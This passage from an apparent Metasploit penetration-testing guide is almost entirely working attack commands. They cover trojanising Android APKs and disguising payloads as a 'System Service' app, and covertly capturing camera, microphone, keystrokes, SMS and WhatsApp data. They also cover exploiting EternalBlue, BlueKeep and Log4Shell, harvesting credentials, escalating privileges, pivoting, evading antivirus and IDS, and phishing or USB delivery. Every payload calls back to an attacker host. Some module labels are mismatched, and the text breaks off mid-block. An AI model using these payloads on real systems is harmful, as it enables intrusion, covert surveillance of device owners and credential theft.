    echo -e "${YELLOW}[6/10] Rebuilding APK...${NC}"
    apktool b "$WORK_DIR/original" -o "$WORK_DIR/unsigned.apk" 2>/dev/null
    echo -e "${GREEN}[+] APK rebuilt${NC}"
    
    # Step 7: Align
    echo -e "${YELLOW}[7/10] Aligning APK...${NC}"
    zipalign -v 4 "$WORK_DIR/unsigned.apk" "$WORK_DIR/aligned.apk" 2>/dev/null
    echo -e "${GREEN}[+] APK aligned${NC}"
    
    # Step 8: Generate signing key
    echo -e "${YELLOW}[8/10] Generating signing key...${NC}"
    keytool -genkeypair -v \
        -keystore "$WORK_DIR/signing.jks" \
        -keyalg RSA -keysize 2048 \
        -validity 10000 \
        -alias pentest \
        -storepass pentest123 \
        -keypass pentest123 \
        -dname "CN=Security Test, OU=Pentest, O=Test, L=Test, S=Test, C=US" 2>/dev/null
    echo -e "${GREEN}[+] Key generated${NC}"
    
    # Step 9: Sign
    echo -e "${YELLOW}[9/10] Signing APK...${NC}"
    apksigner sign \
        --ks "$WORK_DIR/signing.jks" \
        --ks-key-alias pentest \
        --ks-pass pass:pentest123 \
        --key-pass pass:pentest123 \
        --out "$WORK_DIR/signed.apk" \
        "$WORK_DIR/aligned.apk" 2>/dev/null
    echo -e "${GREEN}[+] APK signed${NC}"
    
    # Step 10: Output
    OUTPUT_FILE="injected_$(date +%Y%m%d_%H%M%S).apk"
    cp "$WORK_DIR/signed.apk" "./$OUTPUT_FILE"
    
    echo -e "${YELLOW}[10/10] Verifying...${NC}"
    apksigner verify "./$OUTPUT_FILE"
    
    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}[+] SUCCESS! Injected APK created${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "${CYAN}Output: $OUTPUT_FILE${NC}"
    echo ""
    echo -e "${YELLOW}To start the listener:${NC}"
    echo -e "  msfconsole -q -x \""
    echo -e "    use exploit/multi/handler;"
    echo -e "    set payload android/meterpreter/reverse_tcp;"
    echo -e "    set LHOST $LHOST;"
    echo -e "    set LPORT $LPORT;"
    echo -e "    exploit\""
    echo ""
    
    # Cleanup
    rm -rf "$WORK_DIR"
}

main "$@"
```

### 9.6 Setting Up the Listener

```bash
# ==========================================
# START THE MULTI/HANDLER LISTENER
# ==========================================

# Method 1: Interactive msfconsole
msfconsole

# In msfconsole:
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
exploit -j

# Method 2: One-liner
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.1.10; set LPORT 4444; set ExitOnSession false; exploit -j"

# Method 3: Resource script
cat > android_handler.rc << 'EOF'
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
exploit -j -z
EOF

msfconsole -r android_handler.rc

# Method 4: With HTTPS transport
use exploit/multi/handler
set payload android/meterpreter/reverse_https
set LHOST 192.168.1.10
set LPORT 443
set HandlerSSLCert /path/to/cert.pem
set StagerVerifySSLCert true
set ExitOnSession false
exploit -j

# ==========================================
# MONITORING CONNECTIONS
# ==========================================

# List active sessions
sessions -l

# Interact with a session
sessions -i 1

# Background a session
background

# Auto-migrate sessions
set AutoRunScript migrate -f
```

### 9.7 Post-Connection Android Operations

```bash
# ==========================================
# AFTER CONNECTION IS ESTABLISHED
# ==========================================

# You now have a Meterpreter session on the Android device
# Session type: meterpreter > java/android

# Basic system info
meterpreter > sysinfo
# Computer    : localhost
# OS          : Android 13 (Linux 5.15.41)
# Architecture: aarch64
# Meterpreter : java/android

meterpreter > getuid
# Server username: u0_a123

# ==========================================
# SURVEILLANCE COMMANDS
# ==========================================

# Take photo from camera
webcam_list
webcam_snap -i 1 -p photo_front.jpg     # Front camera
webcam_snap -i 2 -p photo_back.jpg      # Back camera

# Record audio
record_mic -d 10 -f recording.wav       # 10 seconds

# Take screenshot
screenshot screenshot.png

# Keylogging (ethical demonstration only)
keyscan_start
keyscan_dump
keyscan_stop

# ==========================================
# DATA COLLECTION (Authorized only)
# ==========================================

# SMS messages
dump_sms

# Call logs
dump_calls

# Contacts
dump_contacts

# WhatsApp messages (if accessible)
# Navigate to WhatsApp database
cd /data/data/com.whatsapp/databases/
download msgstore.db

# ==========================================
# DEVICE INFORMATION
# ==========================================

# WiFi information
wlan_geolocate          # Geolocate via WiFi

# Device admin
device_get_activity_running_processes
dump_sysinfo

# ==========================================
# NETWORK
# ==========================================

# Network interfaces
ifconfig

# Port forwarding
portfwd add -l 8080 -p 80 -r 10.0.0.1

# ==========================================
# FILE OPERATIONS
# ==========================================

# Browse files
ls
cd /sdcard/
cd /sdcard/DCIM/        # Photos
cd /sdcard/Download/    # Downloads

# Download files
download /sdcard/DCIM/Camera/photo.jpg
download /sdcard/Download/document.pdf

# Upload files
upload payload.jpg /sdcard/Download/
```

---

## 10. Android Penetration Testing with Metasploit

### 10.1 Android Attack Vectors

```
ANDROID ATTACK VECTORS:
├── Application Layer
│   ├── Malicious APK installation (social engineering)
│   ├── Play Store repackaged apps
│   ├── Phishing via SMS/email
│   └── Drive-by downloads
│
├── Network Layer
│   ├── Evil twin WiFi access points
│   ├── ARP spoofing / DNS poisoning
│   ├── SSL/TLS stripping
│   └── Rogue base stations (IMSI catchers)
│
├── Physical Access
│   ├── ADB debugging exploitation
│   ├── USB attacks (BadUSB, Rubber Ducky)
│   ├── Bootloader exploitation
│   └── JTAG/UART debugging
│
├── Browser Exploitation
│   ├── Stagefright media exploits
│   ├── WebView vulnerabilities
│   ├── Chrome/V8 engine exploits
│   └── JavaScript-based attacks
│
└── System Layer
    ├── Kernel exploits (DirtyCow, DirtyPipe)
    ├── Baseband exploits
    ├── Bootloader vulnerabilities
    └── TrustZone/TEE attacks
```

### 10.2 Android Exploits in Metasploit

```bash
# ==========================================
# ANDROID-SPECIFIC EXPLOITS
# ==========================================

# ADB Debug Access (if USB debugging enabled)
use exploit/android/adb/adb_debuggable
set RHOSTS 192.168.1.0/24
set LHOST 192.168.1.10
set PAYLOAD android/meterpreter/reverse_tcp
exploit

# Stagefright (media library vulnerability)
use exploit/android/browser/stagefright_mp4_tx3g_64bit
set SRVHOST 192.168.1.10
set URIPATH /video.mp4
set LHOST 192.168.1.10
set PAYLOAD android/meterpreter/reverse_tcp
exploit

# Samsung Galaxy Keyboard RCE
use exploit/android/browser/samsung_knox_smdm_url
set SRVHOST 192.168.1.10
set URIPATH /update
set LHOST 192.168.1.10
exploit

# Android HTML5 WebView
use exploit/android/browser/webview_addjavascriptinterface
set SRVHOST 192.168.1.10
set URIPATH /
set LHOST 192.168.1.10
exploit

# ==========================================
# ANDROID AUXILIARY MODULES
# ==========================================

# Android WebView file theft
use auxiliary/gather/android_stock_browser_uxss
set SRVHOST 192.168.1.10
set URIPATH /
run

# Samsung Galaxy S7 browser exploit
use exploit/android/browser/samsung_game_launcher
set SRVHOST 192.168.1.10
set LHOST 192.168.1.10
exploit

# ==========================================
# ANDROID POST-EXPLOITATION MODULES
# ==========================================

# After getting a session:

# Enumerate apps
use post/android/gather/enum_applications
set SESSION 1
run

# Dump SMS
use post/android/gather/sms_dump
set SESSION 1
run

# Dump call logs
use post/android/gather/call_log_dump
set SESSION 1
run

# Dump contacts
use post/android/gather/contacts
set SESSION 1
run

# Get WiFi credentials
use post/android/gather/wifi_credentials
set SESSION 1
run

# Check if device is rooted
use post/android/checkifrooted
set SESSION 1
run

# Geolocate device
use post/android/manage/remove_lock
set SESSION 1
run
```

### 10.3 Android Reverse Shell (Without Meterpreter)

```bash
# Generate raw shellcode for custom injection
msfvenom -p android/shell/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f raw \
    -o shell.bin

# Using Java payload for Android (cross-platform)
msfvenom -p java/shell_reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f jar \
    -o shell.jar

# Using Meterpreter over HTTP (better firewall traversal)
msfvenom -p android/meterpreter/reverse_http \
    LHOST=192.168.1.10 \
    LPORT=8080 \
    -f apk \
    -o meterpreter_http.apk

# Using Meterpreter over HTTPS (encrypted)
msfvenom -p android/meterpreter/reverse_https \
    LHOST=192.168.1.10 \
    LPORT=443 \
    -f apk \
    -o meterpreter_https.apk
```

---

## 11. Network Exploitation

### 11.1 SMB Exploits

```bash
# ==========================================
#       ETERNALBLUE (MS17-010)
# ==========================================

# Check vulnerability
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.20
run

# Exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set target 0  # Automatic target
exploit

# ==========================================
#       ETERNALROMANCE (MS17-010)
# ==========================================
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 192.168.1.20
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set SMBUser administrator
set SMBPass password123
exploit

# ==========================================
#       SMB SHARES ENUMERATION
# ==========================================
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.0/24
run

# ==========================================
#       SMB USER ENUMERATION
# ==========================================
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.168.1.0/24
run

# ==========================================
#       MS08-067 (Older Windows)
# ==========================================
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.20
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set target 0
exploit
```

### 11.2 Web Server Exploits

```bash
# ==========================================
#       APACHE STRUTS
# ==========================================
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 192.168.1.20
set RPORT 8080
set TARGETURI /
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       TOMCAT
# ==========================================
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.20
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       WORDPRESS
# ==========================================
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.1.20
set USERNAME admin
set PASSWORD password
set TARGETURI /wordpress/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       LOG4SHELL (CVE-2021-44228)
# ==========================================
use exploit/multi/http/log4shell_header_injection
set RHOSTS 192.168.1.20
set RPORT 8080
set TARGETURI /
set HTTP_HEADER X-Api-Version
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       SPRING CLOUD GATEWAY
# ==========================================
use exploit/multi/http/spring_cloud_gateway_spel_injection
set RHOSTS 192.168.1.20
set RPORT 8080
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       DOTNETNUKE
# ==========================================
use exploit/windows/http/dnn_telerik_deserialization
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit
```

### 11.3 Service-Specific Exploits

```bash
# ==========================================
#       RDP EXPLOITS
# ==========================================

# BlueKeep (CVE-2019-0708)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set target 0
exploit

# ==========================================
#       SSH EXPLOITS
# ==========================================

# SSH authentication brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.20
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set VERBOSE true
run

# ==========================================
#       FTP EXPLOITS
# ==========================================

# VSFTPD backdoor (CVE-2011-2523)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.20
set PAYLOAD cmd/unix/interact
exploit

# ProFTPD mod_copy
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 192.168.1.20
set SITEPATH /var/www/html
set PAYLOAD cmd/unix/reverse_perl
set LHOST 192.168.1.10
exploit

# ==========================================
#       MYSQL EXPLOITS
# ==========================================

# MySQL UDF payload
use exploit/multi/mysql/mysql_udf_payload
set RHOSTS 192.168.1.20
set USERNAME root
set PASSWORD password
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       POSTGRESQL
# ==========================================
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS 192.168.1.20
set USERNAME postgres
set PASSWORD postgres
set DATABASE template1
set PAYLOAD cmd/unix/reverse_perl
set LHOST 192.168.1.10
exploit
```

---

## 12. Post-Exploitation

### 12.1 System Enumeration

```bash
# ==========================================
#       WINDOWS POST-EXPLOITATION
# ==========================================

# System information
use post/windows/gather/enum_applications
set SESSION 1
run

use post/windows/gather/enum_logged_on_users
set SESSION 1
run

use post/windows/gather/enum_shares
set SESSION 1
run

use post/windows/gather/enum_snmp
set SESSION 1
run

# Network information
use post/windows/gather/enum_ad_computers
set SESSION 1
run

# Installed patches
use post/windows/gather/enum_patches
set SESSION 1
run

# Environment variables
use post/multi/gather/env
set SESSION 1
run

# ==========================================
#       LINUX POST-EXPLOITATION
# ==========================================

use post/linux/gather/enum_system
set SESSION 1
run

use post/linux/gather/enum_users_history
set SESSION 1
run

use post/linux/gather/enum_network
set SESSION 1
run

use post/linux/gather/hashdump
set SESSION 1
run

# ==========================================
#       CREDENTIAL HARVESTING
# ==========================================

# Windows SAM dump
use post/windows/gather/smart_hashdump
set SESSION 1
run

# Using Mimikatz via kiwi extension
meterpreter > load kiwi
meterpreter > creds_all

# WiFi passwords
use post/multi/gather/wifi_creds
set SESSION 1
run

# Browser credentials
use post/multi/gather/firefox_creds
set SESSION 1
run

use post/multi/gather/chrome_cookies
set SESSION 1
run

# SSH keys
use post/multi/gather/ssh_creds
set SESSION 1
run

# FTP credentials
use post/multi/gather/filezilla_client_cred
set SESSION 1
run
```

### 12.2 Privilege Escalation

```bash
# ==========================================
#       WINDOWS PRIVILEGE ESCALATION
# ==========================================

# Method 1: getsystem (multiple techniques)
meterpreter > getsystem
# Technique 1: Named Pipe Impersonation
# Technique 2: Named Pipe Impersonation (dropper)
# Technique 3: Token Duplication

# Method 2: Service exploits
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set LHOST 192.168.1.10
exploit

use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set LHOST 192.168.1.10
exploit

# Method 3: Token impersonation
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"

# Method 4: Scheduled task abuse
use exploit/windows/local/ps_wmi_exec
set SESSION 1
set LHOST 192.168.1.10
exploit

# ==========================================
#       LINUX PRIVILEGE ESCALATION
# ==========================================

# DirtyCow (CVE-2016-5195)
use exploit/linux/local/dcow
set SESSION 1
set LHOST 192.168.1.10
exploit

# DirtyPipe (CVE-2022-0847)
use exploit/linux/local/cve_2022_0847_dirtypipe
set SESSION 1
set LHOST 192.168.1.10
exploit

# Sudo Baron Samedit
use exploit/linux/local/sudo_baron_edit
set SESSION 1
set LHOST 192.168.1.10
exploit

# PwnKit (CVE-2021-4034)
use exploit/linux/local/pwnkit
set SESSION 1
set LHOST 192.168.1.10
exploit

# ==========================================
#       ANDROID PRIVILEGE ESCALATION
# ==========================================

# Check if rooted
meterpreter > shell
$ su -c id

# Use kernel exploits for unrooted devices
# (same Linux kernel exploits apply)
```

### 12.3 Lateral Movement

```bash
# ==========================================
#       PASS THE HASH
# ==========================================

use exploit/windows/smb/psexec
set RHOSTS 192.168.1.30
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       PASS THE TICKET
# ==========================================

# Using Kiwi extension
meterpreter > load kiwi
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi

# ==========================================
#       PS EXEC
# ==========================================

use exploit/windows/smb/psexec
set RHOSTS 192.168.1.30
set SMBUser administrator
set SMBPass password123
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       WMI EXEC
# ==========================================

use exploit/windows/local/wmi
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set RHOSTS 192.168.1.30
exploit
```

---

## 13. Pivoting and Lateral Movement

### 13.1 Network Pivoting with Metasploit

```bash
# ==========================================
#       PIVOTING OVERVIEW
# ==========================================

# Network Topology:
# Attacker (Kali)         Target Network
# 192.168.1.10            10.10.10.0/24
#        │                        │
#        │                        │
#        └─── Session 1 ──── 192.168.1.20 (compromised)
#                             │
#                             └─── 10.10.10.5 (internal server)
#                             └─── 10.10.10.10 (internal DB)

# ==========================================
#       METHOD 1: AUTOROUTE + PORTFWD
# ==========================================

# Step 1: Add route through compromised host
meterpreter > run autoroute -s 10.10.10.0/24

# OR from msfconsole
route add 10.10.10.0/24 1

# Verify routes
route print

# Step 2: Set up port forwarding
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.5
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# Step 3: Attack through pivot
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       METHOD 2: SOCKS PROXY
# ==========================================

# Set up SOCKS proxy through session
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Add route
route add 10.10.10.0/24 1

# Configure tools to use SOCKS proxy
# Proxychains configuration (/etc/proxychains4.conf):
# socks5 127.0.0.1 1080

# Use with other tools through proxychains
proxychains nmap -sT -Pn 10.10.10.5
proxychains ssh user@10.10.10.5
proxychains xfreerdp /u:admin /p:pass /v:10.10.10.5

# ==========================================
#       METHOD 3: ROUTE VIA SESSION
# ==========================================

# Automatic routing
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# ==========================================
#       METHOD 4: SOCKS PROXY WITH SSH
# ==========================================

# SSH dynamic port forwarding
meterpreter > shell
ssh -D 1080 -f -N user@10.10.10.5

# Use with proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
```

### 13.2 Advanced Pivoting Scenarios

```bash
# ==========================================
#       MULTI-HOP PIVOTING
# ==========================================

# Network: Attacker -> Host1 -> Host2 -> Target
# 192.168.1.10 -> 192.168.1.20 -> 10.10.10.5 -> 172.16.0.10

# Session 1: Compromise Host1
# Session 2: Compromise Host2 (through pivot)

# Add routes for both networks
route add 10.10.10.0/24 1      # Via session 1
route add 172.16.0.0/24 2      # Via session 2

# Verify
route print

# Now you can attack 172.16.0.10
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.0.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       AUTOMATED PIVOTING
# ==========================================

# Use autoroute post module
use post/multi/manage/autoroute
set SESSION 1
set CMD autoadd
run

# ==========================================
#       PIVOTING WITH CHISEL (Modern Alternative)
# ==========================================

# On Kali (attacker):
# Install chisel
sudo apt install chisel

# Start chisel server
chisel server --reverse --port 8000

# On compromised host (meterpreter shell):
# Upload chisel
upload /usr/bin/chisel /tmp/chisel

# Create reverse SOCKS proxy
shell
chmod +x /tmp/chisel
/tmp/chisel client 192.168.1.10:8000 R:socks

# Now use proxychains with the SOCKS proxy
# proxychains nmap -sT -Pn 10.10.10.0/24
```

---

## 14. Evasion Techniques

### 14.1 Payload Encoding

```bash
# ==========================================
#       PAYLOAD ENCODING
# ==========================================

# List available encoders
msfvenom -l encoders

# Single encoder
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -e x86/shikata_ga_nai \
    -i 5 \
    -f exe \
    -o encoded_payload.exe

# Multiple encoding passes
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -e x86/shikata_ga_nai \
    -i 10 \
    -f raw | \
msfvenom -a x86 --platform windows \
    -e x86/alpha_mixed \
    -i 5 \
    -f exe \
    -o multi_encoded.exe

# Best encoders for AV evasion:
# x86/shikata_ga_nai - Polymorphic XOR additive feedback encoder
# x86/alpha_mixed    - Alpha2 alphanumeric mixedcase encoder
# x86/unicode_mixed  - Unicode mixedcase encoder
# cmd/powershell_base64 - PowerShell base64 encoder

# ==========================================
#       PAYLOAD GENERATION EXAMPLES
# ==========================================

# Windows executable with encoding
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.10 \
    LPORT=443 \
    -e x64/xor_dynamic \
    -i 3 \
    -f exe \
    -o payload.exe

# DLL injection payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f dll \
    -o payload.dll

# PowerShell payload (fileless)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f psh-cmd \
    -o payload.bat

# VBA macro (for Office documents)
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f vba-psh \
    -o macro.vba

# HTA payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f hta-psh \
    -o payload.hta

# Python payload
msfvenom -p python/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f raw \
    -o payload.py

# C# shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f csharp \
    -o shellcode.cs

# Raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f raw \
    -o shellcode.bin

# ==========================================
#       ANDROID PAYLOAD FORMATS
# ==========================================

# Standalone APK
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f apk \
    -o payload.apk

# With app name and icon
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    --app-name "System Service" \
    --app-icon /path/to/icon.png \
    -f apk \
    -o payload.apk
```

### 14.2 Anti-Virus Evasion

```bash
# ==========================================
#       AV EVASION TECHNIQUES
# ==========================================

# Method 1: Payload encoding (basic)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -e x64/xor_dynamic \
    -i 15 \
    --smallest \
    -f exe \
    -o evasive.exe

# Method 2: Using evasion modules
use evasion/windows/windows_defender_exe
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run

use evasion/windows/windows_defender_js_hta
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run

# Method 3: Stage encoding
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
exploit

# Method 4: Custom template
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -x /path/to/legitimate.exe \
    -k \
    -f exe \
    -o payload_with_template.exe

# Method 5: Process injection
# Use process injection instead of running payload directly
# Meterpreter's migrate command helps after initial access
meterpreter > migrate -N explorer.exe

# ==========================================
#       ANDROID AV EVASION
# ==========================================

# Android payloads are less likely to be detected by AV
# but Google Play Protect may flag them

# Method 1: Custom app wrapper
# Wrap payload in a legitimate-looking app

# Method 2: Obfuscate Smali code
# Rename classes, add junk code, modify strings

# Method 3: Use encrypted payload
# Download and decrypt payload at runtime

# Method 4: Stage via HTTPS
msfvenom -p android/meterpreter/reverse_https \
    LHOST=192.168.1.10 \
    LPORT=443 \
    -f apk \
    -o encrypted_payload.apk
```

### 14.3 Network Evasion

```bash
# ==========================================
#       TRAFFIC EVASION
# ==========================================

# Use HTTPS instead of HTTP (encrypted)
set payload windows/x64/meterpreter/reverse_https
set LPORT 443

# Use domain fronting
set HttpHostHeader legitimate-cdn.com

# Custom headers
set HttpUser-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Sleep time (avoid beaconing detection)
set SessionCommunicationTimeout 300
set SessionExpirationTimeout 86400

# ==========================================
#       FIREWALL EVASION
# ==========================================

# Use common ports
set LPORT 443    # HTTPS
set LPORT 53     # DNS
set LPORT 80     # HTTP
set LPORT 8080   # HTTP proxy

# Reverse connection (outbound allowed in most firewalls)
set payload windows/x64/meterpreter/reverse_tcp

# Use HTTP/HTTPS (often allowed)
set payload windows/x64/meterpreter/reverse_https

# ==========================================
#       IDS/IPS EVASION
# ==========================================

# Fragment packets
set EnableContextEncoding true

# Use small payload sizes
set payload windows/shell/reverse_tcp  # Smaller than Meterpreter

# Slow and low scanning
set THREADS 1
set TIMEOUT 30000
```

---

## 15. Social Engineering

### 15.1 Client-Side Attacks

```bash
# ==========================================
#       BROWSER EXPLOITS
# ==========================================

# Browser autopwn (automated)
use auxiliary/server/browser_autopwn2
set SRVHOST 192.168.1.10
set SRVPORT 80
set URIPATH /update
run

# Java applet attack
use exploit/multi/browser/java_signed_applet
set SRVHOST 192.168.1.10
set SRVPORT 80
set URIPATH /java
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# HTA attack
use exploit/windows/misc/hta_server
set SRVHOST 192.168.1.10
set URIPATH /update
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       OFFICE DOCUMENT EXPLOITS
# ==========================================

# Microsoft Office Macro
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit

# DDE exploit
use exploit/windows/fileformat/office_dde_delivery
set FILENAME report.docx
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       PHISHING WITH METASPLOIT
# ==========================================

# SET (Social Engineering Toolkit) integration
# SET uses Metasploit as backend
setoolkit
# Select:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Metasploit Browser Exploit Method

# ==========================================
#       FAKE UPDATE PAGES
# ==========================================

use exploit/multi/browser/java_jre17_exec
set SRVHOST 192.168.1.10
set SRVPORT 80
set URIPATH /update
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit
```

### 15.2 USB-Based Attacks

```bash
# ==========================================
#       HID ATTACKS (with Teensy/Arduino)
# ==========================================

# Generate HID payload
use payload/windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
generate -t raw -f /tmp/hid_payload.bin

# ==========================================
#       USB DRIVE ATTACKS
# ==========================================

# Create autorun payload
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f exe \
    -o /media/usb/update.exe

# Create malicious shortcut (LNK)
use exploit/windows/fileformat/cve_2017_8464_lnk_rce
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit
# Copy generated LNK file to USB
```

---

## 16. Web Application Testing

### 16.1 Web Application Scanning

```bash
# ==========================================
#       WEB SCANNERS
# ==========================================

# HTTP version scanner
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.20
set RPORT 80
run

# Directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.20
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# File brute force
use auxiliary/scanner/http/brute_dirs
set RHOSTS 192.168.1.20
run

# HTTP login brute force
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.20
set USERPASS_FILE /usr/share/wordlists/metasploit/http_default_userpass.txt
run

# WordPress scanner
use auxiliary/scanner/http/wordpress_scanner
set RHOSTS 192.168.1.20
run

# Tomcat scanner
use auxiliary/scanner/http/tomcat_enum
set RHOSTS 192.168.1.20
run

# ==========================================
#       WEB VULNERABILITY SCANNERS
# ==========================================

# SQL injection
use auxiliary/scanner/http/sqlmap
set RHOSTS 192.168.1.20
set TARGETURI /page.php?id=1
run

# XSS detection
use auxiliary/scanner/http/xpath
set RHOSTS 192.168.1.20
run

# LFI detection
use auxiliary/scanner/http/lfi
set RHOSTS 192.168.1.20
run
```

### 16.2 Web Application Exploits

```bash
# ==========================================
#       WORDPRESS EXPLOITS
# ==========================================

use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.1.20
set USERNAME admin
set PASSWORD admin
set TARGETURI /wp/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       JOOMLA EXPLOITS
# ==========================================

use exploit/multi/http/joomla_http_header_rce
set RHOSTS 192.168.1.20
set TARGETURI /
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       DRUPAL EXPLOITS
# ==========================================

use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.1.20
set TARGETURI /
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       TOMCAT EXPLOITS
# ==========================================

use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.20
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set PAYLOAD java/meterpreter/reverse_tcp
